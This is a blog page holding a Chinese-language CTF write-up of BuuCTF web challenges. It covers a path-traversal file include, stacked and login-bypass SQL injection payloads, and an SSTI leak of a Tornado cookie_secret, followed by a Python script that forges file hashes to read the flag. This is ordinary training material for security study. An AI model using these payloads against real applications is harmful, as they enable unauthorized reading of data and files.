@@ -1,0 +1,1350 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="utf-8">
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+  
+  <title itemprop="name">BuuCTF Web writeup 第一部分 | 0xGeekCat</title>
+  
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+  <meta http-equiv="x-dns-prefetch-control" content="on">
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Noto+SerifMerriweather|Merriweather+Sans|Source+Code+Pro|Ubuntu:400,700|Noto+Serif+SC" media="all">
+  <link rel="dns-prefetch" href="//cdn.jsdelivr.net">
+  <link rel="stylesheet" id="saukra_css-css" href="/css/style.css" type="text/css" media="all">
+  <link rel="stylesheet" href="/css/lib.min.css" media="all">
+  <link rel="stylesheet" href="/css/font.css" media="all">
+  <link rel="stylesheet" href="/css/insight.css" media="all">
+  <link rel="stylesheet" href="/css/jquery.fancybox.min.css" media="all">
+  <link rel="stylesheet" href="/css/zoom.css" media="all">
+  <link rel="stylesheet" type="text/css" href="/css/sharejs.css">
+<!--   <link rel="stylesheet" id="saukra_css-css" href="https://2heng.xin/wp-content/cache/autoptimize/css/autoptimize_ad42a61f4c7d4bdd9f91afcff6b5dda5.css
+" type="text/css" media="all"> -->
+  <script>
+  /*Initial Variables*/
+  var mashiro_option = new Object();
+  var mashiro_global = new Object();
+  mashiro_option.NProgressON = true;
+  /* 
+   * 邮箱信息之类的东西可以填在这里，这些js变量基本都作用于sakura-app.js
+   * 这样的设置仅是为了方便在基于PHP开发的主题中设置js变量，既然移植到了Node上，我想或许可以精简这一逻辑吧
+   */
+  mashiro_option.email_domain = "";
+  mashiro_option.email_name = "";
+  mashiro_option.cookie_version_control = "";
+  mashiro_option.qzone_autocomplete = false;
+  mashiro_option.site_name = "Mаксим0xGeekCat";
+  mashiro_option.author_name = "0xGeekCat";
+  mashiro_option.site_url = "https://0xgeekcat.github.io/";
+  mashiro_option.v_appId = "GyC3NzMvd0hT9Yyd2hYIC0MN-gzGzoHsz";
+  mashiro_option.v_appKey = "mgOpfzbkHYqU92CV4IDlAUHQ";
+  mashiro_option.mathjax = "0";
+  mashiro_option.qq_api_url = "https://api.mashiro.top/qqinfo/"; 
+  mashiro_option.qq_avatar_api_url = "https://api.mashiro.top/qqinfo/";
+
+  // mashiro_option.jsdelivr_css_src = "https://cdn.jsdelivr.net/gh/moezx/cdn@3.4.5/css/lib.min.css";
+  // mashiro_option.float_player_on = true;
+
+  /*End of Initial Variables*/
+  </script>
+  <script type="text/javascript">
+  var bg = "https://cdn.jsdelivr.net/gh/0xGeekCat/cdn@2.2/images/Konachan.com%20ls%20black_hair%20f%20toriki%20touhou.jpg,https://cdn.jsdelivr.net/gh/0xGeekCat/cdn@2.2/images/Konachan.com-293503-ghostblade-long_hair-red_hair-sword-tagme_character-thighhighs-weapon-wlop-scaled.jpg,https://cdn.jsdelivr.net/gh/0xGeekCat/cdn@2.2/images/Konachan.com-298784-aeolian_wlop-barefoot-black_hair-braids-ghostblade-headdress-long_hair-ponytail-wlop-scaled.jpg,https://cdn.jsdelivr.net/gh/0xGeekCat/cdn@2.2/images/Konachan.com%20-%20227403%20black_hair%20ghostblade%20jade_(wlop)%20japanese_clothes%20kimono%20logo%20realistic%20short_hair%20tattoo%20umbrella%20wlop.jpg,https://cdn.jsdelivr.net/gh/0xGeekCat/cdn@2.2/images/Konachan.com-281267-aeolian_wlop-black_hair-bow_weapon-close-ghostblade-green_eyes-logo-long_hair-realistic-watermark-weapon-wink-wlop-scaled.jpg".split(",");
+  var bgindex = Math.floor(Math.random()*bg.length);
+  if (!!window.ActiveXObject || "ActiveXObject" in window) { //is IE?
+    alert('朋友，IE浏览器未适配哦~');
+  }
+  </script>
+  <style type="text/css">
+  .hljs-ln{border-collapse:collapse}.hljs-ln td{padding:0}.hljs-ln-n:before{content:attr(data-line-number)}
+  </style>
+  <style type="text/css">.site-top .lower nav{display:block !important;}.author-profile i,.post-like a,.post-share .show-share,.sub-text,.we-info a,span.sitename,.post-more i:hover,#pagination a:hover,.post-content a:hover,.float-content i:hover{color:#FE9600}.feature i,.download,.navigator i:hover,.links ul li:before,.ar-time i,span.ar-circle,.object,.comment .comment-reply-link,.siren-checkbox-radio:checked + .siren-checkbox-radioInput:after{background:#FE9600}::-webkit-scrollbar-thumb{background:#FE9600}.download,.navigator i:hover,.link-title,.links ul li:hover,#pagination a:hover,.comment-respond input[type='submit']:hover{border-color:#FE9600}.entry-content a:hover,.site-info a:hover,.comment h4 a,#comments-navi a.prev,#comments-navi a.next,.comment h4 a:hover,.site-top ul li a:hover,.entry-title a:hover,#archives-temp h3,span.page-numbers.current,.sorry li a:hover,.site-title a:hover,i.iconfont.js-toggle-search.iconsearch:hover,.comment-respond input[type='submit']:hover{color:#FE9600}.comments .comments-main{display:block !important;}.comments .comments-hidden{display:none !important;}background-position:center center;background-attachment:inherit;}
+  </style>
+<meta name="generator" content="Hexo 5.1.1"></head>
+
+<body class="page-template page-template-user page-template-page-analytics page-template-userpage-analytics-php page page-id-1297 chinese-font serif isWebKit">
+  <div class="scrollbar" id="bar">
+  </div>
+  <a href="#" class="cd-top faa-float animated"></a>
+  <section id="main-container">
+    <div class="headertop filter-dim">
+  <div id="banner_wave_1"></div>
+  <div id="banner_wave_2"></div>
+  <figure id="centerbg" class="centerbg">
+    <div class="focusinfo no-select">
+      <div class="header-tou">
+        <a href="https://0xgeekcat.github.io/">
+          <img src="https://cdn.jsdelivr.net/gh/0xGeekCat/cdn@2.2/img/custom/avatar.jpg">
+        </a>
+      </div>
+      <div class="header-info">
+        <p>用来记录我大学最后生涯破釜沉舟力挽狂澜的疯狂学习历程</p>
+        <div class="top-social_v2">
+          <li id="bg-pre">
+            <img class="flipx" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/other/next-b.svg">
+          </li>
+          
+            
+              
+                <li>
+                  <a href="https://github.com/0xGeekCat" target="_blank" class="social-github" title="github">
+                    <img src="https://cdn.jsdelivr.net/gh/0xGeekCat/cdn@2.2/img/social/github.png">
+                  </a>
+                </li>
+              
+            
+              
+                <li>
+                  <a href="http://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&amp;email=1292881925@qq.com" target="_blank" class="social-github" title="email">
+                    <img src="https://cdn.jsdelivr.net/gh/0xGeekCat/cdn@2.2/img/social/email.svg">
+                  </a>
+                </li>
+              
+            
+              
+                <li class="wechat">
+                  <a href="/#">
+                    <img src="https://cdn.jsdelivr.net/gh/0xGeekCat/cdn@2.2/img/social/wechat.png">
+                  </a>
+                  <div class="wechatInner">
+                    <img src="https://cdn.jsdelivr.net/gh/0xGeekCat/cdn@2.2/img/custom/wechat.jpg">
+                  </div>
+                </li>
+              
+            
+          
+          <li id="bg-next">
+            <img src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/other/next-b.svg">
+          </li>
+        </div>
+      </div>
+    </div>
+  </figure>
+  <div id="video-container" style="">
+    <video style="object-fit: fill" id="bgvideo" class="video" video-name="" src="" width="auto" preload="auto">
+    </video>
+    <div id="video-btn" class="loadvideo videolive">
+    </div>
+    <div id="video-add">
+    </div>
+    <div class="video-stu">
+    </div>
+  </div>
+  <div class="headertop-down faa-float animated" onclick="headertop_down()">
+    <span>
+      <i class="fa fa-chevron-down" aria-hidden="true">
+      </i>
+    </span>
+  </div>
+</div>
+    <div id="page" class="site wrapper">
+      <header class="site-header no-select gizle sabit" role="banner">
+  <div class="site-top">
+    <div class="site-branding">
+      <span class="site-title">
+        <span class="logolink moe-mashiro">
+          <a href="/">
+            <span class="sakurasono">Mаксим</span>
+            <span class="shironeko">0xGeekCat</span>
+          </a>
+        </span>
+      </span>
+    </div>
+    <div class="searchbox search-form-submit">
+      <i class="iconfont js-toggle-search iconsearch icon-search">
+      </i>
+    </div>
+    <div id="show-nav" class="showNav mobile-fit">
+      <div class="line line1">
+      </div>
+      <div class="line line2">
+      </div>
+      <div class="line line3">
+      </div>
+    </div>
+    <div class="lower-cantiner">
+      <div class="lower">
+        <nav class="mobile-fit-control hide">
+          <ul id="menu-new" class="menu">
+            
+              <li>
+                <a href="/">
+                  <span class="faa-parent animated-hover">
+                    <i class="fa  fa-fort-awesome faa-shake" aria-hidden="true"></i>
+                    首页
+                  </span>
+                </a>
+                
+              </li>
+            
+              <li>
+                <a href="/archives">
+                  <span class="faa-parent animated-hover">
+                    <i class="fa  fa-archive faa-shake" aria-hidden="true"></i>
+                    归档
+                  </span>
+                </a>
+                
+                  <ul class="sub-menu">
+                    
+                      <li>
+                        <a href="/categories/%E6%8A%80%E6%9C%AF/">
+                          <i class="fa fa-code" aria-hidden="true"></i>
+                          技术
+                        </a>
+                      </li>
+                    
+                      <li>
+                        <a href="/categories/%E7%94%9F%E6%B4%BB/">
+                          <i class="fa fa-file-text-o" aria-hidden="true"></i>
+                          生活
+                        </a>
+                      </li>
+                    
+                      <li>
+                        <a href="/categories/%E8%BD%AC%E8%BD%BD/">
+                          <i class="fa fa-book" aria-hidden="true"></i>
+                          转载
+                        </a>
+                      </li>
+                    
+                  </ul>
+                
+              </li>
+            
+              <li>
+                <a href="javascript:;">
+                  <span class="faa-parent animated-hover">
+                    <i class="fa  fa-list-ul faa-vertical" aria-hidden="true"></i>
+                    书单
+                  </span>
+                </a>
+                
+                  <ul class="sub-menu">
+                    
+                      <li>
+                        <a href="/tags/%E5%B7%B2%E8%AF%BB/">
+                          <i class="fa fa-th-list faa-bounce" aria-hidden="true"></i>
+                          已读
+                        </a>
+                      </li>
+                    
+                      <li>
+                        <a href="/tags/%E6%9C%AA%E8%AF%BB/">
+                          <i class="fa fa-th-list faa-bounce" aria-hidden="true"></i>
+                          未读
+                        </a>
+                      </li>
+                    
+                  </ul>
+                
+              </li>
+            
+              <li>
+                <a href="/">
+                  <span class="faa-parent animated-hover">
+                    <i class="fa  fa-leaf faa-wrench" aria-hidden="true"></i>
+                    关于
+                  </span>
+                </a>
+                
+                  <ul class="sub-menu">
+                    
+                      <li>
+                        <a href="/about/">
+                          <i class="fa fa-meetup" aria-hidden="true"></i>
+                          我？
+                        </a>
+                      </li>
+                    
+                  </ul>
+                
+              </li>
+            
+          </ul>
+        </nav>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <link rel="stylesheet" type="text/css" href="/css/sharejs.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
+<div class="pattern-center-blank"></div>
+
+  <div class="pattern-center single-center">
+    <!-- 有配图默认渲染第一张 -->
+    <div class="pattern-attachment-img lazyload" style="background-image: url(https://cdn.jsdelivr.net/gh/0xGeekCat/cdn@2.2/photos/BuuCTF.png);" src="https://cdn.jsdelivr.net/gh/0xGeekCat/cdn@2.1/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://cdn.jsdelivr.net/gh/0xGeekCat/cdn@2.2/photos/BuuCTF.png">
+    </div>
+    <header class="pattern-header single-header">
+      <h1 class="entry-title">
+      BuuCTF Web writeup 第一部分</h1>
+      <p class="entry-census">
+        <span>
+          <a href="https://0xgeekcat.github.io/">
+            <img src="https://cdn.jsdelivr.net/gh/0xGeekCat/cdn@2.1/img/custom/avatar.jpg">
+          </a>
+        </span>
+        <span>
+          <a href="https://0xgeekcat.github.io/">0xGeekCat</a>
+        </span>
+        <span class="bull">
+        ·</span>
+        2020-8-3<span class="bull">
+        ·</span>
+      <span id="busuanzi_value_page_pv"></span>次阅读</p>
+    </header>
+  </div>
+
+<div id="content" class="site-content">
+  <div id="primary" class="content-area">
+    <main id="main" class="site-main" role="main">
+      <article id="post-1" class="post-1 post type-post status-publish format-standard has-post-thumbnail hentry category-uncategorized">
+        <div class="toc"></div>
+        <!--<div class="toc-entry-content"><!-- 套嵌目录使用（主要为了支援评论）-->
+        
+        <div class="entry-content">
+          <h1 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h1><p>查看源码提示<code>source.php</code>，并在<code> $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;];</code>代码提示下同时访问<code>hint.php</code></p>
+<p><strong>题目源码</strong></p>
+<pre><code class="php">source.php
+
+&lt;?php
+highlight_file(__FILE__);
+class emmm
+&#123;
+    public static function checkFile(&amp;$page)
+    &#123;
+        $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;];
+
+---a
+        if (! isset($page) || !is_string($page)) &#123;
+            echo &quot;you can&#39;t see it&quot;;
+            return false;
+        &#125;
+---b
+        if (in_array($page, $whitelist)) &#123;
+            return true;
+        &#125;
+---c
+        $_page = mb_substr(
+            $page,
+            0,
+            mb_strpos($page . &#39;?&#39;, &#39;?&#39;)
+        );
+        if (in_array($_page, $whitelist)) &#123;
+            return true;
+        &#125;
+---d
+        $_page = urldecode($page);
+        $_page = mb_substr(
+            $_page,
+            0,
+            mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)
+        );
+---e
+        if (in_array($_page, $whitelist)) &#123;
+            return true;
+        &#125;
+        echo &quot;you can&#39;t see it&quot;;
+        return false;
+    &#125;
+&#125;
+
+if (! empty($_REQUEST[&#39;file&#39;]) &amp;&amp; is_string($_REQUEST[&#39;file&#39;]) &amp;&amp; emmm::checkFile($_REQUEST[&#39;file&#39;])) &#123;
+    include $_REQUEST[&#39;file&#39;];
+    exit;
+&#125; else &#123;
+    echo &quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;;
+&#125;
+?&gt;
+
+hint.php
+flag not here, and flag in ffffllllaaaagggg</code></pre>
+<p><strong>解题思路</strong></p>
+<p>利用<code>include()</code>包含<code>ffffllllaaaagggg</code>文件</p>
+<p><strong>代码审计</strong></p>
+<ol>
+<li>传入字符串参数<code>file</code>，且<code>emmm::checkFile($_REQUEST[&#39;file&#39;])</code>值为<code>true</code></li>
+<li><code>a-b</code>区域：传入参数不为字符串类型就返回<code>false</code>；<code>$page</code>必须是字符串</li>
+<li><code>b-c</code>区域：<code>$page</code>的值为<code>source.php</code>或<code>hint.php</code>就返回<code>true</code>；<code>$page</code>必须不为<code>source.php</code>或<code>hint.php</code></li>
+<li><code>c-d</code>区域：截取<code>$page</code>从开头到<code>?</code>的值，如果为<code>source.php</code>或<code>hint.php</code>就返回<code>true</code></li>
+</ol>
+<p><strong>解题方法</strong></p>
+<p>由于flag位于<code>/ffffllllaaaagggg</code>中，所以结合目录穿越构造payload，之所以可以如此构造的原理稍后说明</p>
+<pre><code>?file=hint.php?../../../../../ffffllllaaaagggg</code></pre>
+<h2 id="mb-substr-amp-mb-strpos"><a href="#mb-substr-amp-mb-strpos" class="headerlink" title="mb_substr() &amp; mb_strpos()"></a>mb_substr() &amp; mb_strpos()</h2><ul>
+<li><p><strong>mb_substr</strong> - 获取部分字符串</p>
+<pre><code class="php"> mb_substr ( string $str , int $start [, int $length = NULL [, string $encoding = mb_internal_encoding() ]] ) : string</code></pre>
+<p>根据字符数执行一个多字节安全的<code>substr()</code>操作。位置是从 <code>str</code> 的开始位置进行计数。第一个字符的位置是 0，第二个字符的位置是 1，以此类推</p>
+</li>
+<li><p><strong>mb_strpos</strong> — 查找字符串在另一个字符串中首次出现的位置</p>
+<pre><code class="php"> mb_strpos ( string $haystack , string $needle [, int $offset = 0 [, string $encoding = mb_internal_encoding() ]] ) : int</code></pre>
+<p>查找string在一个string 中首次出现的位置。 基于字符数执行一个多字节安全的<code>strpos</code>操作。第一个字符的位置是 0，第二个字符的位置是 1，以此类推</p>
+</li>
+</ul>
+<h2 id="路径-aaa-…-bbb"><a href="#路径-aaa-…-bbb" class="headerlink" title="路径 aaa/…/bbb"></a>路径 aaa/…/bbb</h2><p><code>aaa/</code>表示当前文件同级目录下的文件夹名(不检测该文件是否存在)</p>
+<p><code>../bbb</code>表示<code>aaa/</code>文件夹所在目录的父级目录下的文件名</p>
+<pre><code>father
+├── aaa(文件夹 不一定要存在)
+└── bbb(文件 一定要存在)</code></pre>
+<p>此题中<code>hint.php?</code>就是一个不存在的文件</p>
+<h1 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h1><p><strong>解题方法</strong></p>
+<p>先进行简单测试，发现过滤<code>select</code></p>
+<pre><code>payload: ?inject=&#39; union select 1,2,3%23
+return : return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);</code></pre>
+<p>测试中发现存在堆叠注入，查询当前数据库表结构，发现flag列名</p>
+<pre><code>payload: ?inject=&#39;;show tables;desc `1919810931114514`;desc words;</code></pre>
+<p><img src="BuuCTF-Web-writeup-%E7%AC%AC%E4%B8%80%E9%83%A8%E5%88%86/image-20200801190203955.png" alt="image-20200801190203955"></p>
+<h2 id="MySQL数据表命名细节"><a href="#MySQL数据表命名细节" class="headerlink" title="MySQL数据表命名细节"></a>MySQL数据表命名细节</h2><p><strong>下列代码中A用全数字做表名，在使用时需要用反引号包裹，不然会产生错误，但如果半数字半字符或全字符则不需要</strong></p>
+<pre><code class="mysql">测试表的结构如下
+MariaDB [test]&gt; desc `1919810931114514`;  --A
++-------+--------------+------+-----+---------+-------+
+| Field | Type         | Null | Key | Default | Extra |
++-------+--------------+------+-----+---------+-------+
+| flag  | varchar(100) | NO   |     | NULL    |       |
++-------+--------------+------+-----+---------+-------+
+1 row in set (0.01 sec)
+
+MariaDB [test]&gt; desc 1919810931114514;
+ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#39;1919810931114514&#39; at line 1
+
+MariaDB [test]&gt; desc words;  --B
++-------+-------------+------+-----+---------+-------+
+| Field | Type        | Null | Key | Default | Extra |
++-------+-------------+------+-----+---------+-------+
+| id    | int(10)     | NO   |     | NULL    |       |
+| data  | varchar(20) | NO   |     | NULL    |       |
++-------+-------------+------+-----+---------+-------+
+2 rows in set (0.00 sec)
+
+MariaDB [test]&gt; desc 0d4y;
++-------+--------------+------+-----+---------+-------+
+| Field | Type         | Null | Key | Default | Extra |
++-------+--------------+------+-----+---------+-------+
+| name  | varchar(100) | NO   |     | NULL    |       |
++-------+--------------+------+-----+---------+-------+
+1 row in set (0.01 sec)</code></pre>
+<p><strong>解题思路</strong></p>
+<ol>
+<li>把<code>1919810931114514</code>改名为<code>words</code>，之后将<code>1919810931114514</code>中的字段<code>flag</code>改名为<code>id</code></li>
+<li>利用<strong>mysql特性</strong>构造<code>&#39; or &#39;1</code>得到flag</li>
+</ol>
+<p><strong>解题过程</strong></p>
+<pre><code>payload: ?inject=&#39;;rename table words to w; rename table `1919810931114514` to words; alter table words change flag id varchar(255);desc words;
+return : 
+array(6) &#123;
+  [0]=&gt;
+  string(2) &quot;id&quot;
+  [1]=&gt;
+  string(12) &quot;varchar(255)&quot;
+  [2]=&gt;
+  string(3) &quot;YES&quot;
+  [3]=&gt;
+  string(0) &quot;&quot;
+  [4]=&gt;
+  NULL
+  [5]=&gt;
+  string(0) &quot;&quot;
+&#125;</code></pre>
+<p>回显可以判断修改成功</p>
+<pre><code>payload: ?inject=1&#39; or &#39;1</code></pre>
+<p><strong>解题思路</strong></p>
+<p>0x00 将查询<code>flag</code>的sql语句预定义</p>
+<p>0x01 执行预定义sql语句</p>
+<p><strong>解题过程</strong></p>
+<pre><code>payload: ?inject=&#39;;set @s = concat(&#39;s&#39;, &#39;elect * from `1919810931114514`&#39;);prepare a from @s; execute a;
+return : strstr($inject, &quot;set&quot;) &amp;&amp; strstr($inject, &quot;prepare&quot;)</code></pre>
+<p>以上回显表示<code>set</code>与<code>prepare</code>不能同时存在，由于MySQL默认情况下大小写不敏感，用<code>Set</code>绕过</p>
+<pre><code>payload: ?inject=&#39;;Set @s = concat(&#39;s&#39;, &#39;elect * from `1919810931114514`&#39;);prepare a from @s;execute a;</code></pre>
+<h2 id="ALTER-statement"><a href="#ALTER-statement" class="headerlink" title="ALTER statement"></a>ALTER statement</h2><p>用于修改数据表名或者修改数据表字段</p>
+<p><strong>删除，添加字段</strong></p>
+<pre><code class="mysql">MariaDB [test]&gt; desc 0d4y;
++-------+--------------+------+-----+---------+-------+
+| Field | Type         | Null | Key | Default | Extra |
++-------+--------------+------+-----+---------+-------+
+| name  | varchar(255) | YES  |     | NULL    |       |
++-------+--------------+------+-----+---------+-------+
+1 row in set (0.00 sec)
+
+MariaDB [test]&gt; alter table 0d4y add age int;
+Query OK, 0 rows affected (0.01 sec)
+Records: 0  Duplicates: 0  Warnings: 0
+
+MariaDB [test]&gt; desc 0d4y;
++-------+--------------+------+-----+---------+-------+
+| Field | Type         | Null | Key | Default | Extra |
++-------+--------------+------+-----+---------+-------+
+| name  | varchar(255) | YES  |     | NULL    |       |
+| age   | int(11)      | YES  |     | NULL    |       |
++-------+--------------+------+-----+---------+-------+
+2 rows in set (0.00 sec)
+
+MariaDB [test]&gt; alter table 0d4y drop age;
+Query OK, 0 rows affected (0.01 sec)
+Records: 0  Duplicates: 0  Warnings: 0
+
+MariaDB [test]&gt; desc 0d4y;
++-------+--------------+------+-----+---------+-------+
+| Field | Type         | Null | Key | Default | Extra |
++-------+--------------+------+-----+---------+-------+
+| name  | varchar(255) | YES  |     | NULL    |       |
++-------+--------------+------+-----+---------+-------+
+1 row in set (0.00 sec)</code></pre>
+<p><strong>修改字段</strong></p>
+<pre><code class="mysql">MariaDB [test]&gt; desc 0d4y;
++-------+--------------+------+-----+---------+-------+
+| Field | Type         | Null | Key | Default | Extra |
++-------+--------------+------+-----+---------+-------+
+| name  | varchar(255) | YES  |     | NULL    |       |
++-------+--------------+------+-----+---------+-------+
+1 row in set (0.00 sec)
+
+MariaDB [test]&gt; alter table 0d4y modify name varchar(100);
+Query OK, 1 row affected (0.02 sec)
+Records: 1  Duplicates: 0  Warnings: 0
+
+MariaDB [test]&gt; desc 0d4y;
++-------+--------------+------+-----+---------+-------+
+| Field | Type         | Null | Key | Default | Extra |
++-------+--------------+------+-----+---------+-------+
+| name  | varchar(100) | YES  |     | NULL    |       |
++-------+--------------+------+-----+---------+-------+
+1 row in set (0.00 sec)
+
+MariaDB [test]&gt; alter table 0d4y change `name` `id` int;
+Query OK, 1 row affected, 1 warning (0.02 sec)
+Records: 1  Duplicates: 0  Warnings: 1
+
+MariaDB [test]&gt; desc 0d4y;
++-------+---------+------+-----+---------+-------+
+| Field | Type    | Null | Key | Default | Extra |
++-------+---------+------+-----+---------+-------+
+| id    | int(11) | YES  |     | NULL    |       |
++-------+---------+------+-----+---------+-------+
+1 row in set (0.00 sec)</code></pre>
+<h2 id="SET-statement"><a href="#SET-statement" class="headerlink" title="SET statement"></a>SET statement</h2><p>MySQL用户变量定义格式</p>
+<pre><code class="mysql">set @v = xxx;</code></pre>
+<h2 id="PREPARE-statement"><a href="#PREPARE-statement" class="headerlink" title="PREPARE statement"></a>PREPARE statement</h2><pre><code class="mysql">PREPARE name from &#39;[my sql sequece]&#39;;   //预定义SQL语句
+EXECUTE name;  //执行预定义SQL语句
+(DEALLOCATE || DROP) PREPARE name;  //删除预定义SQL语句</code></pre>
+<pre><code class="mysql">MariaDB [test]&gt; prepare flag from &quot;select * from 0d4y&quot;;
+Query OK, 0 rows affected (0.00 sec)
+Statement prepared
+
+MariaDB [test]&gt; execute flag;
++------+
+| id   |
++------+
+|    0 |
++------+
+1 row in set (0.00 sec)
+
+MariaDB [test]&gt; drop prepare flag;
+Query OK, 0 rows affected (0.00 sec)</code></pre>
+<h1 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h1><p>payload: <code>query = 3</code></p>
+<p><code>Array ( [0] =&gt; 1 )</code></p>
+<p>payload: <code>query = 3;</code></p>
+<p><code>Array ( [0] =&gt; 3 )</code></p>
+<p>payload: <code>query = 3;show tables;</code></p>
+<p><code>Array ( [0] =&gt; 1 ) Array ( [0] =&gt; Flag )</code></p>
+<p>从回显判断，数值型注入，注入点存在数据比较，且存在堆叠注入漏洞</p>
+<p>查询语句</p>
+<pre><code class="php">$sql = &quot;select &quot;.$post[&#39;query&#39;].&quot;||flag from Flag&quot;;</code></pre>
+<p><code>||</code>在MySQL中可以作为比较运算符or以及字符串连接符</p>
+<p>当<code>sql_mode</code>模式为<code>pipes_as_concat</code>时，<code>||</code>为字符串连接符</p>
+<p>目前很显然是作为比较运算符<code>or</code></p>
+<pre><code class="mysql">MariaDB [CTF]&gt; SELECT @@sql_mode;
++--------------------------------------------+
+| @@sql_mode                                 |
++--------------------------------------------+
+| NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION |
++--------------------------------------------+
+1 row in set (0.00 sec)</code></pre>
+<p>payload: <code>query = *,1</code></p>
+<p><code>Array ( [0] =&gt; SUCTF&#123;SUCTF_baby_sql_chall_120993n810h3&#125; [1] =&gt; 1 )</code></p>
+<pre><code class="mysql">MariaDB [CTF]&gt; select *,1 || flag from flag;
++------------------------------------------+-----------+
+| Flag                                     | 1 || flag |
++------------------------------------------+-----------+
+| SUCTF&#123;SUCTF_baby_sql_chall_120993n810h3&#125; |         1 |
++------------------------------------------+-----------+
+1 row in set (0.00 sec)</code></pre>
+<p>也可以将<code>||</code>设置为字符串连接符</p>
+<pre><code class="mysql">MariaDB [CTF]&gt; set sql_mode = pipes_as_concat;
+Query OK, 0 rows affected (0.00 sec)
+
+MariaDB [CTF]&gt; select @@sql_mode;
++-----------------+
+| @@sql_mode      |
++-----------------+
+| PIPES_AS_CONCAT |
++-----------------+
+1 row in set (0.00 sec)
+
+MariaDB [CTF]&gt; select 1||&#39;asd&#39;;
++----------+
+| 1||&#39;asd&#39; |
++----------+
+| 1asd     |
++----------+
+1 row in set (0.00 sec)
+
+MariaDB [CTF]&gt; select 0||&#39;asd&#39;;
++----------+
+| 0||&#39;asd&#39; |
++----------+
+| 0asd     |
++----------+
+1 row in set (0.00 sec)</code></pre>
+<p>payload: <code>1;set sql_mode=pipes_as_concat;select 1</code></p>
+<p><code>Array ( [0] =&gt; 1 ) Array ( [0] =&gt; 1SUCTF&#123;SUCTF_baby_sql_chall_120993n810h3&#125; )</code></p>
+<pre><code class="mysql">MariaDB [CTF]&gt; select 1||flag from flag;
++-------------------------------------------+
+| 1||flag                                   |
++-------------------------------------------+
+| 1SUCTF&#123;SUCTF_baby_sql_chall_120993n810h3&#125; |
++-------------------------------------------+
+1 row in set (0.00 sec)</code></pre>
+<h1 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h1><p><strong>解题思路</strong></p>
+<p>猜测后台代码如下</p>
+<pre><code class="php">$sql = SELECT * DROM database WHERE username = &#39;$username&#39; AND password = &#39;$password&#39;;</code></pre>
+<p><strong>解题方法</strong></p>
+<p>构造payload<code>/check.php?username=admin&#39; or 1=1 %23&amp;password=1</code></p>
+<h1 id="easy-tornado"><a href="#easy-tornado" class="headerlink" title="easy_tornado"></a>easy_tornado</h1><p><strong>题目提示</strong></p>
+<pre><code>-- /flag.txt
+flag in /fllllllllllllag
+
+-- /welcome.txt
+render
+
+-- /hints.txt
+md5(cookie_secret+md5(filename))</code></pre>
+<p><strong>解题思路</strong></p>
+<p>0x00 <code>render</code>模板渲染暗示存在<a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/83999.html">SSTI服务端模板注入攻击</a></p>
+<p>0x01 <code>handler.settings</code>保存配置选项，包括<code>cookie_secret</code></p>
+<p><strong>解题方法</strong></p>
+<p>访问文件时观察url</p>
+<pre><code>payload: /file?filename=/welcome.txt&amp;filehash=1ee0dabf22eb0879a60444267ed3e063</code></pre>
+<p>存在文件读取点，访问<code>/fllllllllllllag</code></p>
+<p>页面跳转至<code>/error?msg=Error</code></p>
+<p>尝试SSTI</p>
+<pre><code>payload: /error?msg=&#123;&#123;handler.settings&#125;&#125;
+
+界面回显: &#123;&#39;autoreload&#39;: True, &#39;compiled_template_cache&#39;: False, &#39;cookie_secret&#39;: &#39;9c83fab7-1b67-404c-9aa8-69453579ac8c&#39;&#125;</code></pre>
+<p><strong>exp.py</strong></p>
+<pre><code class="python">import hashlib
+import requests
+
+
+def md5(s):
+    md5 = hashlib.md5()
+    md5.update(s.encode())
+    return md5.hexdigest()
+
+
+filename = &quot;/fllllllllllllag&quot;
+cookie_secret = &quot;9c83fab7-1b67-404c-9aa8-69453579ac8c&quot;
+filehash = md5(cookie_secret + md5(filename))
+url = &quot;http://93dc9c40-c8fc-4f2c-bce7-e28fae7437a6.node2.buuoj.cn.wetolink.com:82/file?filename=%s&amp;filehash=%s&quot; % (filename, filehash)
+html = requests.get(url)
+
+print(html.text)</code></pre>
+<h1 id="极客大挑战-2019-Havefun"><a href="#极客大挑战-2019-Havefun" class="headerlink" title="[极客大挑战 2019]Havefun"></a>[极客大挑战 2019]Havefun</h1><p><strong>解题思路</strong></p>
+<p>查看源码</p>
+<p><strong>代码审计</strong></p>
+<pre><code class="php">$cat=$_GET[&#39;cat&#39;];
+echo $cat;
+if($cat==&#39;dog&#39;)&#123;
+    echo &#39;Syc&#123;cat_cat_cat_cat&#125;&#39;;
+&#125;</code></pre>
+<p><strong>解题方法</strong></p>
+<pre><code>/?cat=dog</code></pre>
